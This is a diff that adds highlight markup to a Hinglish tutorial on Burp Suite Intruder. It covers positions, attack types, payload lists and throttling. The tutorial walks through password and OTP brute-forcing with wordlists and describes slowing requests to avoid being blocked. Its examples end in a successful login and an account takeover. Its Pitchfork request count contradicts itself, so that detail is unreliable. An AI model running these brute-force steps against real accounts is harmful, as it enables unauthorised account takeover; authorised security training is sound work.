+[[HL::**Step 6: Resource Pool – Speed set karo**::HL]]
 ```text
-- "Resource Pool" tab par click karo.
-- Default "Use Burp's auto-throttling" hota hai. Agar tezi se attack karna hai toh naya pool banao aur "Maximum concurrent requests" badhao (e.g., 10). Lekin dhyan rakhna server block na karde.
+- [[HL::"Resource Pool" tab par click karo.::HL]]
+- [[HL::Default "Use Burp's auto-throttling" hota hai. Agar tezi se attack karna hai toh naya pool banao aur "Maximum concurrent requests" badhao (e.g., 10). Lekin dhyan rakhna server block na::HL]] karde.
 ```
-**Step 7: Options Tab – Result analysis set karo**
+[[HL::**Step 7: Options Tab – Result analysis set karo**::HL]]
 ```text
-- "Options" tab par click karo.
-- "Grep - Match" section mein "Add" karo aur wo text daalo jo successful login mein dikhta hai (e.g., "Welcome" ya "Dashboard"). Isse Intruder response mein ye text dhundh ke mark karega.
+- [[HL::"Options" tab par click karo.::HL]]
+- [[HL::"Grep - Match" section mein "Add" karo aur wo text daalo jo successful login mein dikhta hai (e.g., "Welcome" ya "Dashboard"). Isse Intruder response mein ye text dhundh ke mark karega.::HL]]
 ```
-**Step 8: Attack start karo**
+[[HL::**Step 8: Attack start karo**::HL]]
 ```text
-- Top right par "Start attack" button click karo.
-- Ek naya window khulega jisme attack chal raha hoga. Har request ka status, length, aur grep match result dikhega.
+- [[HL::Top right par "Start attack" button click karo.::HL]]
+- [[HL::Ek naya window khulega jisme attack chal raha hoga. Har request ka status, length, aur grep match result dikhega::HL]].
 ```
 **Expected Output:**
 ```text
-Attack window mein ek table dikhegi:
-Request # | Payload | Status | Length | Grep Match
-1         | admin   | 200    | 3456   | [No match]
-2         | 123456  | 200    | 3456   | [No match]
-3         | password| 302    | 1200   | [match]  <-- successful login
+[[HL::Attack window mein ek table dikhegi:::HL]]
+[[HL::Request # | Payload | Status | Length | Grep Match::HL]]
+[[HL::1         | admin   | 200    | 3456   | [No match]::HL]]
+[[HL::2         | 123456  | 200    | 3456   | [No match]::HL]]
+[[HL::3         | password| 302    | 1200   | [match]  <-- successful login::HL]]
 ```
 
 ### ⚖️ 8. Comparison (Intruder Tabs vs Repeater):
@@ -3476,9 +3476,9 @@ Request # | Payload | Status | Length | Grep Match
   **Actually:** Resource pool thread count control karta hai. Iska matlab kitni requests ek saath parallel bhejni hain. Agar 10 set kiya toh ek baar mein 10 requests jayengi. Agar 1 set kiya toh ek ke baad ek (serial).
 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
-**Scenario:** Ek bug bounty hunter ne Facebook ke ek endpoint par **OTP brute-force** kiya.  
-**How they used it:** Unhone request ko Intruder mein bheja, Positions tab mein OTP parameter mark kiya, Payloads mein 0000 se 9999 tak numbers daale, Options mein grep match set kiya "Login Successful" text ke liye.  
-**Result:** Unhe sahi OTP mil gaya aur Facebook ne unhe **$5000** ka bounty diya.
+[[HL::**Scenario:** Ek bug bounty hunter ne Facebook ke ek endpoint par **OTP brute-force** kiya.::HL]]  
+[[HL::**How they used it:** Unhone request ko Intruder mein bheja, Positions tab mein OTP parameter mark kiya, Payloads mein 0000 se 9999 tak numbers daale, Options mein grep match set kiya "Login Successful" text ke liye.::HL]]  
+[[HL::**Result:** Unhe sahi OTP mil gaya aur Facebook ne unhe **$5000** ka bounty diya::HL]].
 
 ### 🎨 12. Visual Diagram (ASCII Art):
 ````
@@ -3499,10 +3499,10 @@ Request # | Payload | Status | Length | Grep Match
 ````
 
 ### 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1:** Payloads mein hamesha **wordlist** use karo, manually typing mat karo. RockYou.txt jaise famous lists rakho.
-- **Tip 2:** Positions tab mein **"Add §"** ke alawa tum **"Clear §"** se saare marks hata kar sirf relevant field mark karo.
-- **Tip 3:** Resource pool mein **"Throttle between requests"** use karo agar server throttling detect kare. Jaise 200-500 ms delay daal do.
-- **Tip 4:** Options mein **"Grep Extract"** use karo agar response se kuch specific data nikalna ho (e.g., CSRF token).
+- [[HL::**Tip 1:** Payloads mein hamesha **wordlist** use karo, manually typing mat karo. RockYou.txt jaise famous lists rakho.::HL]]
+- [[HL::**Tip 2:** Positions tab mein **"Add §"** ke alawa tum **"Clear §"** se saare marks hata kar sirf relevant field mark karo.::HL]]
+- [[HL::**Tip 3:** Resource pool mein **"Throttle between requests"** use karo agar server throttling detect kare. Jaise 200-500 ms delay daal do.::HL]]
+- [[HL::**Tip 4:** Options mein **"Grep Extract"** use karo agar response se kuch specific data nikalna ho (e.g., CSRF token::HL]]).
 
 ### ⚠️ 14. Consequences of Failure (Agar galat kiya toh?):
 - **Scenario 1:** Tumne Payloads mein encoding galat set kar di (jaise base64). Toh server ko sahi payload nahi milega aur attack fail ho jayega.
@@ -3534,61 +3534,61 @@ Request # | Payload | Status | Length | Grep Match
 Socho tum kisi **lock ka combination** todna chahte ho. Lock mein 3 numbers hote hain (jaise 10-20-30). Tum pehle number 10 chhod kar baaki fixed rakhoge? Nahi, tum teeno numbers ghumana chahte ho. Lekin agar sirf teesra number todna hai, toh do number fixed rakhoge. **Positions tab** wahi kaam karta hai – tum batate ho ki request ke andar **kaunse parameters change karne hain** (payload daalna hai) aur kaunse fixed rakhne hain. `§` symbol wo jagah hai jahan payload jayega.
 
 ### 📖 3. Technical Definition (Interview Answer):
-Positions tab Intruder ka wo section hai jahan tum HTTP request ke **un parts ko mark** karte ho jinhe tum payload se replace karna chahte ho. Burp automatically query string parameters, body parameters, aur cookie values ko detect karta hai aur unhe `§` symbol mein wrap kar deta hai. Tum manually bhi marks add/remove kar sakte ho.
+[[HL::Positions tab Intruder ka wo section hai jahan tum HTTP request ke **un parts ko mark** karte ho jinhe tum payload se replace karna chahte ho. Burp automatically query string parameters, body parameters, aur cookie values ko detect karta hai aur unhe `§` symbol mein wrap kar deta hai. Tum manually bhi marks add/remove kar sakte ho::HL]].
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Agar tum saare parameters test karoge toh request invalid ho sakti hai (e.g., tumne session token bhi replace kar diya).  
-**Solution:** Positions tab se tum sirf relevant parameters (jaise username, password) mark karte ho. Baaki values (jaise CSRF token) fixed rehti hain, taaki server request ko accept kare.
+[[HL::**Problem:** Agar tum saare parameters test karoge toh request invalid ho sakti hai (e.g., tumne session token bhi replace kar diya).::HL]]  
+[[HL::**Solution:** Positions tab se tum sirf relevant parameters (jaise username, password) mark karte ho. Baaki values (jaise CSRF token) fixed rehti hain, taaki server request ko accept kare::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-Positions tab open karoge toh kuch aisa dikhega:
+[[HL::Positions tab open karoge toh kuch aisa dikhega:::HL]]
 ```
-GET /login?username=§admin§&password=§123§ HTTP/1.1
-Host: example.com
-Cookie: session=abc123
+[[HL::GET /login?username=§admin§&password=§123§ HTTP/1.1::HL]]
+[[HL::Host: example.com::HL]]
+[[HL::Cookie: session=abc123::HL]]
 ```
-- `§` symbol ke beech mein jo bhi value hai, wahi payload se replace hogi.
-- Top par buttons honge: **Add §**, **Clear §**, **Auto §**, **Refresh**.
+- [[HL::`§` symbol ke beech mein jo bhi value hai, wahi payload se replace hogi.::HL]]
+- [[HL::Top par buttons honge: **Add §**, **Clear §**, **Auto §**, **Refresh**::HL]].
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-1. Jab tum request Intruder mein bhejte ho, Burp request ko parse karta hai.
-2. Wo automatically sabhi parameter values ko detect karta hai (query string, body, cookies).
-3. Un values ke aage-piche `§` symbol laga deta hai (Auto marking).
-4. Tum buttons ka use karke in marks ko modify kar sakte ho.
-5. Attack start karne par Intruder har payload ko `§` ki jagah insert karta hai (attack type ke hisaab se).
+1. [[HL::Jab tum request Intruder mein bhejte ho, Burp request ko parse karta hai.::HL]]
+2. [[HL::Wo automatically sabhi parameter values ko detect karta hai (query string, body, cookies).::HL]]
+3. [[HL::Un values ke aage-piche `§` symbol laga deta hai (Auto marking).::HL]]
+4. [[HL::Tum buttons ka use karke in marks ko modify kar sakte ho.::HL]]
+5. [[HL::Attack start karne par Intruder har payload ko `§` ki jagah insert karta hai (attack type ke hisaab se::HL]]).
 
 ### 💻 7. Hands-On: Step-by-Step Practical:
-**Step 1: Request Intruder mein bhejo**
+[[HL::**Step 1: Request Intruder mein bhejo**::HL]]
 ```text
-- Burp Proxy mein request pakdo → Right-click → "Send to Intruder".
+- [[HL::Burp Proxy mein request pakdo → Right-click → "Send to Intruder".::HL]]
 ```
-**Step 2: Positions tab par jao**
+[[HL::**Step 2: Positions tab par jao**::HL]]
 ```text
-- Intruder tab mein jaake "Positions" par click karo.
+- [[HL::Intruder tab mein jaake "Positions" par click karo::HL]].
 ```
-**Step 3: Automatic marks dekho**
+[[HL::**Step 3: Automatic marks dekho**::HL]]
 ```text
-- Tumhe request dikhegi jisme automatically kuch parameters ke around § symbol hoga. Jaise: username=§admin§&password=§123§.
+- [[HL::Tumhe request dikhegi jisme automatically kuch parameters ke around § symbol hoga. Jaise: username=§admin§&password=§123§.::HL]]
 ```
-**Step 4: Sirf relevant parameters mark karo**
+[[HL::**Step 4: Sirf relevant parameters mark karo**::HL]]
 ```text
-- Maan lo tum sirf password test karna chahte ho, username fixed rakhna hai. 
-- Pehle "Clear §" button click karo. Saare marks hat jayenge.
-- Ab sirf password ki value (e.g., "123") select karo (mouse se drag karo).
-- Phir "Add §" button click karo. Ab waisa dikhega: password=§123§.
-- Username ab bina § ke rahega, isliye wo change nahi hoga.
+- [[HL::Maan lo tum sirf password test karna chahte ho, username fixed rakhna hai.::HL]] 
+- [[HL::Pehle "Clear §" button click karo. Saare marks hat jayenge.::HL]]
+- [[HL::Ab sirf password ki value (e.g., "123") select karo (mouse se drag karo).::HL]]
+- [[HL::Phir "Add §" button click karo. Ab waisa dikhega: password=§123§.::HL]]
+- [[HL::Username ab bina § ke rahega, isliye wo change nahi hoga.::HL]]
 ```
-**Step 5: Advanced marking – Multiple positions**
+[[HL::**Step 5: Advanced marking – Multiple positions**::HL]]
 ```text
-- Agar dono test karne hain (username aur password), toh unhe alag-alag mark karo.
-- Jaise: username=§admin§&password=§123§.
-- Dhyan rakho ki ek request mein multiple § ho sakte hain, attack type decide karega kaise replace hoga.
+- [[HL::Agar dono test karne hain (username aur password), toh unhe alag-alag mark karo.::HL]]
+- [[HL::Jaise: username=§admin§&password=§123§.::HL]]
+- [[HL::Dhyan rakho ki ek request mein multiple § ho sakte hain, attack type decide karega kaise replace hoga.::HL]]
 ```
-**Step 6: Attack type choose karo (topic 6.3 mein detail)**
+[[HL::**Step 6: Attack type choose karo (topic 6.3 mein detail)**::HL]]
 ```text
-- Positions tab ke neeche "Attack type" dropdown hai. Yahan se Sniper, Battering ram, etc. choose kar sakte ho.
+- [[HL::Positions tab ke neeche "Attack type" dropdown hai. Yahan se Sniper, Battering ram, etc. choose kar sakte ho.::HL]]
 ```
-**Step 7: Payloads set karo aur attack chalao**
+[[HL::**Step 7: Payloads set karo aur attack chalao**::HL]]
 ```text
 - Payloads tab jaake wordlist daalo, phir "Start attack".
 ```
@@ -3606,15 +3606,15 @@ Cookie: session=abc123
 - **Mistake 3:** Multiple positions mark karne ke baad galat attack type select kiya. **Fix:** Samjho ki Sniper ek time par ek position replace karta hai, Cluster bomb sab combinations.
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
-- **"Log sochte hain ki § symbol keyboard se type karna padta hai."**  
-  **Actually:** Yeh symbol Burp automatically daalta hai jab tum "Add §" click karte ho. Tumhe khud type nahi karna.
-- **"Log confuse hote hain ki jab multiple positions mark hain, toh har position mein ek hi payload jayega ya alag-alag."**  
-  **Actually:** Ye attack type par depend karta hai. Sniper mein ek position par ek payload (cyclic), Cluster bomb mein har combination.
+- **"[[HL::Log sochte hain ki § symbol keyboard se type karna padta hai."::HL]]**  
+  [[HL::**Actually:** Yeh symbol Burp automatically daalta hai jab tum "Add §" click karte ho. Tumhe khud type nahi karna::HL]].
+- **"[[HL::Log confuse hote hain ki jab multiple positions mark hain, toh har position mein ek hi payload jayega ya alag-alag."::HL]]**  
+  [[HL::**Actually:** Ye attack type par depend karta hai. Sniper mein ek position par ek payload (cyclic), Cluster bomb mein har combination::HL]].
 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
-**Scenario:** Ek pentester ne ek e-commerce site ke **password reset feature** mein OTP brute-force karna tha. Request mein email parameter fixed tha aur OTP parameter variable.  
-**How they used it:** Unhone request Intruder mein bheji, Positions tab mein sirf OTP parameter mark kiya (email ko mark nahi kiya). Phir Payloads mein 000000-999999 daale.  
-**Result:** Sahi OTP mila aur account takeover kiya.
+[[HL::**Scenario:** Ek pentester ne ek e-commerce site ke **password reset feature** mein OTP brute-force karna tha. Request mein email parameter fixed tha aur OTP parameter variable.::HL]]  
+[[HL::**How they used it:** Unhone request Intruder mein bheji, Positions tab mein sirf OTP parameter mark kiya (email ko mark nahi kiya). Phir Payloads mein 000000-999999 daale.::HL]]  
+[[HL::**Result:** Sahi OTP mila aur account takeover kiya::HL]].
 
 ### 🎨 12. Visual Diagram (ASCII Art):
 ```
@@ -3640,10 +3640,10 @@ Cookie: session=abc123
 - **Scenario 2:** Agar koi required parameter mark karna bhool gaye (jaise CSRF token), toh har request invalid hogi aur attack useless.
 
 ### ❓ 15. FAQ (Interview Questions):
-- **Q1: Positions tab mein "Add §" button ka kya kaam hai?**  
-  **A1:** Selected text ke around § symbol lagata hai, jisse wo payload insertion point ban jata hai.
-- **Q2: "Clear §" se kya hota hai?**  
-  **A2:** Saare § symbols hata deta hai, matlab koi bhi payload nahi jayega (attack sirf 1 request bhejega).
+- [[HL::**Q1: Positions tab mein "Add §" button ka kya kaam hai?**::HL]]  
+  [[HL::**A1:** Selected text ke around § symbol lagata hai, jisse wo payload insertion point ban jata hai.::HL]]
+- [[HL::**Q2: "Clear §" se kya hota hai?**::HL]]  
+  [[HL::**A2:** Saare § symbols hata deta hai, matlab koi bhi payload nahi jayega (attack sirf 1 request bhejega::HL]]).
 - **Q3: "Auto §" button kya karta hai?**  
   **A3:** Burp dobara request parse karke automatically parameters mark kar deta hai (default marking).
 - **Q4: Kya hum headers mein bhi positions mark kar sakte hain?**  
@@ -3669,18 +3669,18 @@ Socho tum **4 tarah ke bandook** chala sakte ho:
 
 ### 📖 3. Technical Definition (Interview Answer):
 Intruder mein 4 attack types hote hain jo define karte hain ki **payloads ko multiple positions par kaise apply karna hai**:
-- **Sniper:** Ek payload list; har position par ek-ek karke payload apply hota hai (total requests = positions × payload size).
-- **Battering Ram:** Ek payload list; ek hi payload sab positions par ek saath apply hota hai (total requests = payload size).
-- **Pitchfork:** Multiple payload lists (parallel); har list se ek payload uthata hai aur respective positions par daalta hai (total requests = max size of lists, agar lists unequal hain toh extra ignored).
-- **Cluster Bomb:** Multiple payload lists (all combinations); har list ke har payload ko doosre list ke har payload ke saath combine karta hai (total requests = product of list sizes).
+- [[HL::**Sniper:** Ek payload list; har position par ek-ek karke payload apply hota hai (total requests = positions × payload size).::HL]]
+- [[HL::**Battering Ram:** Ek payload list; ek hi payload sab positions par ek saath apply hota hai (total requests = payload size).::HL]]
+- [[HL::**Pitchfork:** Multiple payload lists (parallel); har list se ek payload uthata hai aur respective positions par daalta hai (total requests = max size of lists, agar lists unequal hain toh extra ignored).::HL]]
+- [[HL::**Cluster Bomb:** Multiple payload lists (all combinations); har list ke har payload ko doosre list ke har payload ke saath combine karta hai (total requests = product of list sizes::HL]]).
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Agar tum multiple parameters test kar rahe ho (jaise username aur password), toh tumhe decide karna hoga ki inhe kaise combine karna hai. Ek simple wordlist dono ke liye kaam karegi ya alag-alag?  
-**Solution:** Attack types tumhe flexibility dete hain. 
-- **Sniper:** Jab sirf ek parameter variable ho (e.g., password brute-force).
-- **Battering Ram:** Jab saare parameters ki value same honi chahiye (e.g., username=admin, password=admin).
-- **Pitchfork:** Jab tumhare paas pre-defined pairs ho (e.g., username aur password ki list ek saath, jaise combo lists).
-- **Cluster Bomb:** Jab tum har possible combination test karna chahte ho (full brute-force).
+[[HL::**Problem:** Agar tum multiple parameters test kar rahe ho (jaise username aur password), toh tumhe decide karna hoga ki inhe kaise combine karna hai. Ek simple wordlist dono ke liye kaam karegi ya alag-alag?::HL]]  
+[[HL::**Solution:** Attack types tumhe flexibility dete hain.::HL]] 
+- [[HL::**Sniper:** Jab sirf ek parameter variable ho (e.g., password brute-force).::HL]]
+- [[HL::**Battering Ram:** Jab saare parameters ki value same honi chahiye (e.g., username=admin, password=admin).::HL]]
+- [[HL::**Pitchfork:** Jab tumhare paas pre-defined pairs ho (e.g., username aur password ki list ek saath, jaise combo lists).::HL]]
+- [[HL::**Cluster Bomb:** Jab tum har possible combination test karna chahte ho (full brute-force::HL]]).
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 Positions tab mein **Attack type** dropdown ke neeche ye 4 options dikhenge:
@@ -3692,45 +3692,45 @@ Ek baar select karne par neeche ek chhota sa description aa sakta hai.
 Payloads tab mein, agar multiple lists allowed hain (Pitchfork, Cluster Bomb), toh multiple payload sets dikhenge (Payload Set 1, Payload Set 2, etc.).
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-**Sniper Workflow:**
-- Positions: 2 (username, password)
-- Payload list: [a,b,c] (size 3)
-- Requests: 2×3 = 6
-  1. username=a, password=fixed
-  2. username=b, password=fixed
-  3. username=c, password=fixed
-  4. username=fixed, password=a
-  5. username=fixed, password=b
-  6. username=fixed, password=c
+**[[HL::Sniper Workflow::HL]]:**
+- [[HL::Positions: 2 (username, password)::HL]]
+- [[HL::Payload list: [a,b,c] (size 3)::HL]]
+- [[HL::Requests: 2×3 = 6::HL]]
+  1. [[HL::username=a, password=fixed::HL]]
+  2. [[HL::username=b, password=fixed::HL]]
+  3. [[HL::username=c, password=fixed::HL]]
+  4. [[HL::username=fixed, password=a::HL]]
+  5. [[HL::username=fixed, password=b::HL]]
+  6. [[HL::username=fixed, password=c::HL]]
 
-**Battering Ram Workflow:**
-- Positions: 2
-- Payload list: [a,b,c]
-- Requests: 3
-  1. username=a, password=a
-  2. username=b, password=b
-  3. username=c, password=c
+**[[HL::Battering Ram Workflow::HL]]:**
+- [[HL::Positions: 2::HL]]
+- [[HL::Payload list: [a,b,c]::HL]]
+- [[HL::Requests: 3::HL]]
+  1. [[HL::username=a, password=a::HL]]
+  2. [[HL::username=b, password=b::HL]]
+  3. [[HL::username=c, password=c::HL]]
 
-**Pitchfork Workflow:**
-- Positions: 2
-- Payload Set 1: [u1,u2,u3] (size 3)
-- Payload Set 2: [p1,p2] (size 2)
-- Requests: max(3,2) = 3? Actually, Pitchfork min size tak pairs banata hai? Usually it stops when any list exhausts, so requests = min(size1, size2) = 2.
-  1. username=u1, password=p1
-  2. username=u2, password=p2
-  3. (list 1 ka u3 ignored because list 2 khatam)
+**[[HL::Pitchfork Workflow::HL]]:**
+- [[HL::Positions: 2::HL]]
+- [[HL::Payload Set 1: [u1,u2,u3] (size 3)::HL]]
+- [[HL::Payload Set 2: [p1,p2] (size 2)::HL]]
+- [[HL::Requests: max(3,2) = 3? Actually, Pitchfork min size tak pairs banata hai? Usually it stops when any list exhausts, so requests = min(size1, size2) = 2::HL]].
+  1. [[HL::username=u1, password=p1::HL]]
+  2. [[HL::username=u2, password=p2::HL]]
+  3. [[HL::(list 1 ka u3 ignored because list 2 khatam::HL]])
 
-**Cluster Bomb Workflow:**
-- Positions: 2
-- Payload Set 1: [u1,u2] (size 2)
-- Payload Set 2: [p1,p2,p3] (size 3)
-- Requests: 2×3 = 6
-  1. username=u1, password=p1
-  2. username=u1, password=p2
-  3. username=u1, password=p3
-  4. username=u2, password=p1
-  5. username=u2, password=p2
-  6. username=u2, password=p3
+**[[HL::Cluster Bomb Workflow::HL]]:**
+- [[HL::Positions: 2::HL]]
+- [[HL::Payload Set 1: [u1,u2] (size 2)::HL]]
+- [[HL::Payload Set 2: [p1,p2,p3] (size 3)::HL]]
+- [[HL::Requests: 2×3 = 6::HL]]
+  1. [[HL::username=u1, password=p1::HL]]
+  2. [[HL::username=u1, password=p2::HL]]
+  3. [[HL::username=u1, password=p3::HL]]
+  4. [[HL::username=u2, password=p1::HL]]
+  5. [[HL::username=u2, password=p2::HL]]
+  6. [[HL::username=u2, password=p3::HL]]
 
 ### 💻 7. Hands-On: Step-by-Step Practical (Choosing Attack Type):
 **Scenario:** Tum ek login form test kar rahe ho jisme username aur password field hai. Tumhare paas 10 common usernames aur 100 common passwords hain.
@@ -3772,15 +3772,15 @@ Attack window mein 1000 rows dikhengi. Har row mein username, password, status c
 
 ### 🚫 9. Common Mistakes (Beginner Traps):
 - **Mistake 1:** Cluster bomb use karte waqt bhool gaye ki product bahut bada ho sakta hai. Jaise 1000×1000 = 1 million requests, jisse server down ho sakta hai. **Fix:** Pehle chhoti list se test karo, ya resource pool mein delay daalo.
-- **Mistake 2:** Pitchfork mein lists ki length equal nahi hai, toh kuch payloads waste ho jayenge. **Fix:** Ensure karo ki lists ki length equal ho ya use cluster bomb.
+- [[HL::**Mistake 2:** Pitchfork mein lists ki length equal nahi hai, toh kuch payloads waste ho jayenge. **Fix:** Ensure karo ki lists ki length equal ho ya use cluster bomb::HL]].
 - **Mistake 3:** Sniper mein sirf ek position mark kiya hai toh wo theek hai, lekin agar multiple positions hain aur tum ek hi payload list se kaam chala rahe ho, toh har position ke liye alag requests banegi – kabhi kabhi ye useful hai (e.g., fuzzing multiple parameters).
 - **Mistake 4:** Battering ram mein multiple positions hain aur payload list mein special characters hain, toh sab positions par same special character jayega, jo expected nahi ho sakta.
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
-- **"Log sochte hain ki Sniper sirf ek position ke liye hai."**  
-  **Actually:** Sniper multiple positions ke saath bhi kaam karta hai. Wo pehle ek position par saare payloads try karta hai, phir agle position par. Is tarah har position alag-alag test hoti hai.
-- **"Log confuse hote hain ki Pitchfork aur Cluster bomb mein kya farak hai."**  
-  **Actually:** Pitchfork parallel pairing karta hai – pehla payload set 1 ka pehla item set 2 ke pehle item ke saath. Cluster bomb har possible pair banata hai. Pitchfork tab use karo jab tumhare paas pehle se paired data ho (jaise combo list), cluster bomb tab jab independent lists ho.
+- **"[[HL::Log sochte hain ki Sniper sirf ek position ke liye hai."::HL]]**  
+  [[HL::**Actually:** Sniper multiple positions ke saath bhi kaam karta hai. Wo pehle ek position par saare payloads try karta hai, phir agle position par. Is tarah har position alag-alag test hoti hai::HL]].
+- **"[[HL::Log confuse hote hain ki Pitchfork aur Cluster bomb mein kya farak hai."::HL]]**  
+  [[HL::**Actually:** Pitchfork parallel pairing karta hai – pehla payload set 1 ka pehla item set 2 ke pehle item ke saath. Cluster bomb har possible pair banata hai. Pitchfork tab use karo jab tumhare paas pehle se paired data ho (jaise combo list), cluster bomb tab jab independent lists ho::HL]].
 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 **Scenario:** Ek bug bounty hunter ne **subdomain takeover** ke liye fuzzing ki. Unke paas 1000 subdomains ki list thi aur 50 CNAME values.  
@@ -3819,16 +3819,16 @@ Pos1: [p1] [p2] [p3] -> then Pos2: [p1] [p2] [p3]
 - **Scenario 3:** Pitchfork mein lists ki lengths mismatch ki, toh kuch payloads gayab ho gaye.
 
 ### ❓ 15. FAQ (Interview Questions):
-- **Q1: Sniper attack type mein agar 2 positions hain aur payload list size 100 hai, toh total requests kitni?**  
-  **A1:** 2 × 100 = 200 requests.
-- **Q2: Battering ram mein ek hi payload sab positions par kyun jaata hai?**  
-  **A2:** Kyunki ye attack type ek hi value ko ek saath multiple jagah daalta hai, useful for same value across fields.
-- **Q3: Pitchfork aur cluster bomb mein se kaunsa fast hai?**  
-  **A3:** Pitchfork generally faster because total requests kam hote hain (min of list sizes), jabki cluster bomb product leta hai.
-- **Q4: Agar mere paas 3 positions hain aur sirf 2 payload lists, toh kaunsa attack type kaam karega?**  
-  **A4:** Sniper aur Battering ram ek list se kaam kar lete hain. Pitchfork aur cluster bomb ko utni hi lists chahiye jitni positions hain. Agar 3 positions hain toh 3 lists chahiye, warna error aayega.
-- **Q5: Kya hum ek hi attack mein alag-alag positions ke liye alag payload lists use kar sakte hain?**  
-  **A5:** Haan, Pitchfork aur Cluster bomb mein aisa possible hai.
+- [[HL::**Q1: Sniper attack type mein agar 2 positions hain aur payload list size 100 hai, toh total requests kitni?**::HL]]  
+  [[HL::**A1:** 2 × 100 = 200 requests.::HL]]
+- [[HL::**Q2: Battering ram mein ek hi payload sab positions par kyun jaata hai?**::HL]]  
+  [[HL::**A2:** Kyunki ye attack type ek hi value ko ek saath multiple jagah daalta hai, useful for same value across fields.::HL]]
+- [[HL::**Q3: Pitchfork aur cluster bomb mein se kaunsa fast hai?**::HL]]  
+  [[HL::**A3:** Pitchfork generally faster because total requests kam hote hain (min of list sizes), jabki cluster bomb product leta hai.::HL]]
+- [[HL::**Q4: Agar mere paas 3 positions hain aur sirf 2 payload lists, toh kaunsa attack type kaam karega?**::HL]]  
+  [[HL::**A4:** Sniper aur Battering ram ek list se kaam kar lete hain. Pitchfork aur cluster bomb ko utni hi lists chahiye jitni positions hain. Agar 3 positions hain toh 3 lists chahiye, warna error aayega.::HL]]
+- [[HL::**Q5: Kya hum ek hi attack mein alag-alag positions ke liye alag payload lists use kar sakte hain?**::HL]]  
+  [[HL::**A5:** Haan, Pitchfork aur Cluster bomb mein aisa possible hai::HL]].
 
 ### 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary):
 "Attack types decide karte hain ki payloads kaise lagenge: Sniper ek-ek karke, Battering ram sab jagah same, Pitchfork parallel pairs, Cluster bomb sab combinations."
@@ -3849,36 +3849,36 @@ Pos1: [p1] [p2] [p3] -> then Pos2: [p1] [p2] [p3]
 Socho tum machine gun chala rahe ho. **Payloads** matlab **goli ki mala** – ki kitni goliyaan hain, kis tarah ki hain (numbers, names, special characters). Machine gun mein tum goliyaan kaise daalte ho? Ek magazine mein ek saath bahut saari goliyaan. Yahan bhi tum **payload list** (wordlist) load karte ho. Lekin kabhi tumhe goli par kuch **processing** bhi karni padti hai – jaise goli pe pehle "X" nishaan laga do (add prefix), ya goli ko paint kar do (encode). **Payload Encoding** ye ensure karta hai ki goli server tak sahi format mein pahuche, jaise URL safe ho.
 
 ### 📖 3. Technical Definition (Interview Answer):
-Payloads Tab Intruder ka wo section hai jahan tum **attack ke liye values define karte ho** jo positions par insert hongi. Isme tum payload set, payload type, payload options (simple list, brute force, etc.), payload processing (encoding, prefix/suffix), aur payload encoding (URL encoding) configure kar sakte ho. Tum ek ya multiple payload sets bana sakte ho depending on attack type.
+[[HL::Payloads Tab Intruder ka wo section hai jahan tum **attack ke liye values define karte ho** jo positions par insert hongi. Isme tum payload set, payload type, payload options (simple list, brute force, etc.), payload processing (encoding, prefix/suffix), aur payload encoding (URL encoding) configure kar sakte ho. Tum ek ya multiple payload sets bana sakte ho depending on attack type::HL]].
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Sirf positions mark karne se kaam nahi chalega. Tumhe batana padega ki **kaunsi values** un positions par daalni hain. Agar manually daaloge toh hazaaro baar click karna padega.  
-**Solution:** Payloads tab tumhe **automated values provide karta hai** – list se, ya brute force se, ya dates/numbers generate karke. Saath hi tum payloads mein **transformations** apply kar sakte ho (jaise base64 encode) taaki server ki requirement match ho. Agar server URL encoding expect karta hai, toh payload encoding option kaam aata hai.
+[[HL::**Problem:** Sirf positions mark karne se kaam nahi chalega. Tumhe batana padega ki **kaunsi values** un positions par daalni hain. Agar manually daaloge toh hazaaro baar click karna padega.::HL]]  
+[[HL::**Solution:** Payloads tab tumhe **automated values provide karta hai** – list se, ya brute force se, ya dates/numbers generate karke. Saath hi tum payloads mein **transformations** apply kar sakte ho (jaise base64 encode) taaki server ki requirement match ho. Agar server URL encoding expect karta hai, toh payload encoding option kaam aata hai::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 Payloads tab open karoge toh kuch aisa dikhega:
 ```
-Payload Sets
-You can define one or more payload sets. The number of sets depends on the attack type defined in the Positions tab.
-Payload set: 1   (2 positions marked, so 2 sets available in Pitchfork/Cluster bomb)
-Payload type: Simple list
+[[HL::Payload Sets::HL]]
+[[HL::You can define one or more payload sets. The number of sets depends on the attack type defined in the Positions tab.::HL]]
+[[HL::Payload set: 1   (2 positions marked, so 2 sets available in Pitchfork/Cluster bomb)::HL]]
+[[HL::Payload type: Simple list::HL]]
 
-Payload Options [Simple list]
-[Load...]  [Add]  [Paste]  [Remove]  [Clear]
+[[HL::Payload Options [Simple list]::HL]]
+[[HL::[Load...]  [Add]  [Paste]  [Remove]  [Clear]::HL]]
 
-Payload Processing
-[Add] [Edit] [Remove] [Up] [Down]
+[[HL::Payload Processing::HL]]
+[[HL::[Add] [Edit] [Remove] [Up] [Down]::HL]]
 
-Payload Encoding
-[URL-encode these characters]: = & ; etc.
+[[HL::Payload Encoding::HL]]
+[[HL::[URL-encode these characters]: = & ; etc::HL]].
 ```
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-1. **Payload Set:** Attack type ke hisaab se multiple sets allowed. Sniper/Battering ram mein sirf 1 set; Pitchfork/Cluster bomb mein jitne positions utne sets.
-2. **Payload Type:** Decide karta hai values kaise generate hongi. Simple list sabse common – tum static list dete ho. Brute force – character sets se combinations banata hai. Numbers – range generate karta hai. Dates – date range.
-3. **Payload Options:** Yahan tum list load karte ho (Load) ya manually entries add karte ho (Add).
-4. **Payload Processing:** Har payload par operations apply hote hain – jaise hash karna, encode karna, prefix/suffix jodna, match/replace.
